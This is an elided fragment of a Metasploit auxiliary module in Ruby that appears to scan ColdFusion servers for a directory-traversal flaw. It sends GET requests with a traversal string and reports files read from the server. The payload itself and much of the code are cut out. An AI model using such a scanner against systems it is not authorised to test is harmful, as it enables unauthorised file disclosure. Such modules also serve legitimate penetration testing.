...
class MetasploitModule < Msf::Auxiliary
  ...
  def run_host(ip)
    ...
    urls.each do |url|
      res = send_request_raw('uri' => url + locale + trav,
                             'method'  => 'GET',
                             'headers' =>
          {
            'Connection' => "keep-alive",
      ...
      if res.nil?
        ...
        if res.body =~ /\<title\>(.*)\<\/title\>/im
          fileout = Regexp.last_match(1)
          if fileout !~ /Login$/ && fileout !~ /^Welcome to ColdFusion/ && fileout !~ /^Archives and Deployment/
            print_good("#{ip} FILE: #{fileout}")
            break
          end
        end
      else
        next if (res.code == 500) || (res.code == 404) || (res.code == 302)
        print_error("#{ip} #{res}")
      end
    end
